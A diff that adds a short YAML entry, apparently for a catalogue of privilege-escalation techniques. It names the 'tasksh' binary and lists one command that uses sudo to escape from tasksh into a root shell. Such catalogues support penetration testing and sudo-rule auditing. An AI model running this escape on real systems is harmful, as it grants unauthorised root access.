@@ -1,0 +1,4 @@
+name: tasksh
+binary_path: /usr/bin/tasksh
+exploit_cmds:
+- sudo /usr/bin/tasksh && !/bin/sh
